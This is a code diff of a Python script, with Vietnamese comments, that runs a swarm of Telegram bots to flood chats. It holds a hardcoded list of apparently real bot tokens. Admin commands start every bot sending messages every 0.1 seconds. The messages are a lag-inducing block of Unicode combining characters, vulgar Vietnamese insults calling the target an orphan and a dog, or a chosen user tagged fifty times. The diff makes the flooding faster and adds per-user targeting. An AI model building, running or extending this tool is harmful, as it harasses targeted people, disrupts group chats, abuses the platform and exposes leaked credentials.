@@ -4,7 +4,7 @@ from flask import Flask
 import time
 import requests
 
-# --- DANH SÁCH TOKEN CỦA ÔNG ---
+# --- CẤU HÌNH HỆ THỐNG ---
 RAW_TOKENS = [
     '8429960682:AAHltNvwWjEn1QC_f5R8JPgz7uN1uFhny18', '8481938728:AAGen1t8Tz3jeu02kJ8HoCIZLiPLdd687n8',
     '8739448460:AAGNLEW-WDvatbxmPLzkziG5jpd5hTRfqiE', '8689807630:AAEoXvm45QaW1jlT-H_KzNlmCpu50Q3k2S4',
@@ -21,137 +21,173 @@ RAW_TOKENS = [
 ]
 
 VALID_TOKENS = []
-BOT_USERNAMES = []
-ADMIN_LIST = [7153197678]
+ADMIN_LIST = [7153197678] 
 is_spaming = False
-spam_delay = 0.5 
+spam_delay = 0.1 
 app = Flask('')
 
 @app.route('/')
-def home(): return f"BOTS LIVE: {len(VALID_TOKENS)}"
+def home(): return "ULTIMATE SWARM V27 - ONLINE"
 
-# --- VĂN BẢN LAG SIÊU DÀI ---
+# --- VĂN BẢN TẢNG ĐÁ (FULL 3X - KHÔNG RÚT GỌN) ---
 LAG_TEXT = """
-꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰
-జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
-็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็
-꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰
-జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
-็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็
-꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰
-జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
-็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็
-꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰
-జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
-็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็
-꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰
+జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
+జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
+జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
+జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
+జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
+జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
+జ్ఞాజ్ఞాజ్ఞాజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
+జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
+జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
+జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
+జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
+జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
+జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
+జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
+జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
+జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
+జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
+జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
+జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
+జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
+జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
+జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
+జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
+జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
 """
 
-# --- VĂN BẢN ĐÀI ---
 WAR_TEXT = """
-cn choa ei=))=))=))=))=))
-m chay dau cho thoat khoi tay t=))=))
-sua len di con dix mồ côi=))=))
-slow vcl e ơi mồ côi gáy gắt lên=))=))
-cay di e cay di e cmm tk nfu=))=))
-cmm nfu nfu nfu mồ côi sủa gắt=))=))
-choa sua tiep di bố m đang đợi m đây=))=))
-thanh nien mồ côi sủa đê gáy gắt lên e=))=))
-bố m đang vả vỡ mõm m đây con dog=))=))
-cay vcl kkk bất lực rồi đúng k e=))=))
-tk ga vcl nhìn bầy bot vả m nè=))=))
+cn choa ei=))=)) sua di con dix mo coi gáy gắt lên e ei=))=)) m mồ côi à=))=)) sua len di con dix mồ côi=))=))
+m chay dau cho thoat khoi tay cha hquy=))=)) sua len di con dix mồ côi=))=))
+slow vcl e ơi mồ côi gáy gắt lên=))=)) m yeu ot z tk nfu học đòi war bot=))=))
+cay lam dung k nhìn màn hình nhảy chữ đi=))=)) cay di e cay di e cmm tk nfu=))=))
+cmm nfu nfu nfu mồ côi sủa gắt=))=)) choa sua tiep di bố m đang đợi m đây=))=))
+bố m vả nát gáo m nè con dog mồ côi gáy lên=))=))
+cn choa ei=))=)) sua di con dix mo coi gáy gắt lên e ei=))=)) m mồ côi à=))=)) sua len di con dix mồ côi=))=))
+m chay dau cho thoat khoi tay cha hquy=))=)) sua len di con dix mồ côi=))=))
+slow vcl e ơi mồ côi gáy gắt lên=))=)) m yeu ot z tk nfu học đòi war bot=))=))
+cay lam dung k nhìn màn hình nhảy chữ đi=))=)) cay di e cay di e cmm tk nfu=))=))
+cmm nfu nfu nfu mồ côi sủa gắt=))=)) choa sua tiep di bố m đang đợi m đây=))=))
+bố m vả nát gáo m nè con dog mồ côi gáy lên=))=))
+m chay dau cho thoat khoi tay cha hquy=))=)) sua len di con dix mồ côi=))=))
+slow vcl e ơi mồ côi gáy gắt lên=))=)) m yeu ot z tk nfu học đòi war bot=))=))
+cay lam dung k nhìn màn hình nhảy chữ đi=))=)) cay di e cay di e cmm tk nfu=))=))
+cmm nfu nfu nfu mồ côi sủa gắt=))=)) choa sua tiep di bố m đang đợi m đây=))=))
+bố m vả nát gáo m nè con dog mồ côi gáy lên=))=))
+m chay dau cho thoat khoi tay cha hquy=))=)) sua len di con dix mồ côi=))=))
+slow vcl e ơi mồ côi gáy gắt lên=))=)) m yeu ot z tk nfu học đòi war bot=))=))
+cay lam dung k nhìn màn hình nhảy chữ đi=))=)) cay di e cay di e cmm tk nfu=))=))
+cmm nfu nfu nfu mồ côi sủa gắt=))=)) choa sua tiep di bố m đang đợi m đây=))=))
+bố m vả nát gáo m nè con dog mồ côi gáy lên=))=))
+m chay dau cho thoat khoi tay cha hquy=))=)) sua len di con dix mồ côi=))=))
+slow vcl e ơi mồ côi gáy gắt lên=))=)) m yeu ot z tk nfu học đòi war bot=))=))
+cay lam dung k nhìn màn hình nhảy chữ đi=))=)) cay di e cay di e cmm tk nfu=))=))
+cmm nfu nfu nfu mồ côi sủa gắt=))=)) choa sua tiep di bố m đang đợi m đây=))=))
+bố m vả nát gáo m nè con dog mồ côi gáy lên=))=))
 """
 
-def launch_attack(chat_id, mode, custom_text=None):
+# --- CÔNG NHÂN SPAM (XẢ TỨC THÌ) ---
+def start_worker(tk, chat_id, mode, custom_text, target_tag):
+    bot = telebot.TeleBot(tk)
+    while is_spaming:
+        try:
+            if mode == 'lag': bot.send_message(chat_id, LAG_TEXT)
+            elif mode == 'dai': bot.send_message(chat_id, WAR_TEXT)
+            elif mode == 'tag': 
+                tag_content = (f"{target_tag} sua de con choa mo coi=))=))\n" * 50)
+                bot.send_message(chat_id, tag_content)
+            elif mode == 'custom': bot.send_message(chat_id, custom_text)
+            time.sleep(spam_delay)
+        except:
+            time.sleep(0.5)
+
+def trigger_all(chat_id, mode, custom_text="", target_tag=""):
     global is_spaming
-    def attack_task(tk):
-        worker = telebot.TeleBot(tk)
-        while is_spaming:
-            try:
-                if mode == 'lag': worker.send_message(chat_id, LAG_TEXT)
-                elif mode == 'dai': worker.send_message(chat_id, WAR_TEXT)
-                elif mode == 'text': worker.send_message(chat_id, custom_text)
-                elif mode == 'tag': worker.send_message(chat_id, f"GỌI HỒN THẰNG CÔ NÔ @all")
-                time.sleep(spam_delay)
-            except: break
+    is_spaming = True
     for t in VALID_TOKENS:
-        threading.Thread(target=attack_task, args=(t,), daemon=True).start()
+        threading.Thread(target=start_worker, args=(t, chat_id, mode, custom_text, target_tag), daemon=True).start()
 
-def bot_engine(token, is_master):
-    try:
-        bot = telebot.TeleBot(token)
-        if is_master:
-            @bot.message_handler(func=lambda m: m.from_user.id in ADMIN_LIST)
-            def admin_handler(m):
-                global is_spaming, spam_delay, ADMIN_LIST
-                txt = m.text.lower()
-                
-                if txt == '/help':
-                    bot.reply_to(m, "👑 [MASTER] ĐANG ĐIỀU KHIỂN\n/splag | /spdai | /spam [t] | /sptag\n/list | /info | /dung\n/setdelay [s] | /addadm [id] | /xoaadm [id]")
-                elif txt == '/splag':
-                    is_spaming = True
-                    bot.reply_to(m, "🌪️ BẮT ĐẦU GÂY LAG!")
-                    launch_attack(m.chat.id, 'lag')
-                elif txt == '/spdai':
-                    is_spaming = True
-                    bot.reply_to(m, "🔥 TỔNG LỰC CHIẾN ĐÀI!")
-                    launch_attack(m.chat.id, 'dai')
-                elif txt.startswith('/spam '):
-                    is_spaming = True
-                    launch_attack(m.chat.id, 'text', m.text[6:])
-                elif txt == '/sptag':
-                    is_spaming = True
-                    launch_attack(m.chat.id, 'tag')
-                elif txt == '/dung':
-                    is_spaming = False
-                    bot.reply_to(m, "🛑 DỪNG TOÀN BỘ.")
-                elif txt == '/list':
-                    bot.reply_to(m, "🤖 DANH SÁCH BOT SỐNG:\n" + "\n".join(BOT_USERNAMES))
-                elif txt == '/info':
-                    bot.reply_to(m, f"📊 HT: {len(VALID_TOKENS)} Bot | Delay: {spam_delay}s")
-                elif txt.startswith('/setdelay '):
-                    try:
-                        spam_delay = float(m.text.split(' ')[1])
-                        bot.reply_to(m, f"✅ Đã chỉnh delay: {spam_delay}s")
-                    except: pass
-                elif txt.startswith('/addadm '):
-                    try:
-                        nid = int(m.text.split(' ')[1])
-                        if nid not in ADMIN_LIST: ADMIN_LIST.append(nid)
-                        bot.reply_to(m, f"✅ Thêm Admin: {nid}")
-                    except: pass
-                elif txt.startswith('/xoaadm '):
-                    try:
-                        rid = int(m.text.split(' ')[1])
-                        if rid in ADMIN_LIST: ADMIN_LIST.remove(rid)
-                        bot.reply_to(m, f"❌ Xóa Admin: {rid}")
-                    except: pass
+# --- CHỈ HUY MASTER (ĐẦY ĐỦ LỆNH) ---
+def master_listener(token):
+    bot = telebot.TeleBot(token)
+    @bot.message_handler(func=lambda m: m.from_user.id in ADMIN_LIST)
+    def handle(m):
+        global is_spaming, spam_delay
+        cmd = m.text.lower()
 
-        bot.infinity_polling(timeout=20, skip_pending=True)
-    except: pass
+        # NHÓM LỆNH CHIẾN ĐẤU (0.1S TRIGGER)
+        if cmd == '/splag':
+            trigger_all(m.chat.id, 'lag')
+            bot.send_message(m.chat.id, "🌪️ SWARM LAG ON!")
 
-def check_and_start():
-    global VALID_TOKENS, BOT_USERNAMES
-    print("--- ĐANG QUÉT TOKEN ---")
+        elif cmd == '/spdai':
+            trigger_all(m.chat.id, 'dai')
+            bot.send_message(m.chat.id, "🔥 SWARM WAR ON!")
+
+        elif cmd.startswith('/sptag '):
+            target = m.text.split(' ')[1]
+            trigger_all(m.chat.id, 'tag', target_tag=target)
+            bot.send_message(m.chat.id, f"🎯 TARGETING: {target}")
+
+        elif cmd.startswith('/spam '):
+            trigger_all(m.chat.id, 'custom', custom_text=m.text[6:])
+            bot.send_message(m.chat.id, "🚀 CUSTOM ON")
+
+        elif cmd == '/dung':
+            is_spaming = False
+            bot.send_message(m.chat.id, "🛑 ALL STOPPED.")
+
+        # NHÓM LỆNH HỆ THỐNG
+        elif cmd == '/info':
+            bot.reply_to(m, f"👤 ID: `{m.from_user.id}`\n🤖 Bots Live: {len(VALID_TOKENS)}\n⚡ Delay: {spam_delay}s", parse_mode="Markdown")
+
+        elif cmd == '/list':
+            bot.reply_to(m, f"✅ Sẵn sàng {len(VALID_TOKENS)} bốt.")
+
+        elif cmd.startswith('/setdelay '):
+            try:
+                spam_delay = float(m.text.split(' ')[1])
+                bot.reply_to(m, f"⚡ Delay set: {spam_delay}s")
+            except: pass
+
+        elif cmd.startswith('/addadm '):
+            try:
+                new_id = int(m.text.split(' ')[1])
+                if new_id not in ADMIN_LIST: ADMIN_LIST.append(new_id)
+                bot.reply_to(m, f"✅ Thêm Admin: {new_id}")
+            except: pass
+
+        elif cmd.startswith('/xoaadm '):
+            try:
+                rem_id = int(m.text.split(' ')[1])
+                if rem_id in ADMIN_LIST and rem_id != 7153197678: 
+                    ADMIN_LIST.remove(rem_id)
+                    bot.reply_to(m, f"❌ Xóa Admin: {rem_id}")
+            except: pass
+
+        elif cmd == '/help':
+            h = "LỆNH:\n/splag, /spdai, /sptag, /spam, /info, /list, /setdelay, /addadm, /xoaadm, /dung"
+            bot.reply_to(m, h)
+
+    bot.infinity_polling(timeout=10, skip_pending=True)
+
+# --- KHỞI TẠO VÀ LỌC TOKEN CHẾT ---
+def init():
+    global VALID_TOKENS
+    print("--- ĐANG LỌC TOKEN ---")
     for t in RAW_TOKENS:
         try:
-            # Gửi request kiểm tra token trực tiếp
-            r = requests.get(f"https://api.telegram.org/bot{t}/getMe", timeout=5).json()
-            if r.get("ok"):
-                is_master = (len(VALID_TOKENS) == 0)
-                VALID_TOKENS.append(t)
-                u_name = r['result']['username']
-                BOT_USERNAMES.append(f"@{u_name}")
-                threading.Thread(target=bot_engine, args=(t, is_master), daemon=True).start()
-                print(f"[LIVE] {u_name} {'(ADMIN)' if is_master else ''}")
-            else:
-                print(f"[DEAD] Token không hợp lệ hoặc bị xóa.")
-        except:
-            print(f"[ERROR] Không thể kết nối với token.")
+            r = requests.get(f"https://api.telegram.org/bot{t}/getMe", timeout=2).json()
+            if r.get("ok"): VALID_TOKENS.append(t)
+        except: pass
     
-    print(f"--- HOÀN TẤT: {len(VALID_TOKENS)} BOT HOẠT ĐỘNG ---")
+    if VALID_TOKENS:
+        # Chọn con Bot sống đầu tiên làm Chỉ huy
+        threading.Thread(target=master_listener, args=(VALID_TOKENS[0],), daemon=True).start()
+        print(f"--- ĐÃ KÍCH HOẠT {len(VALID_TOKENS)} BOT ---")
 
 if __name__ == "__main__":
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()
-    check_and_start()
-    while True: time.sleep(3)
+    init()
+    while True: time.sleep(2)
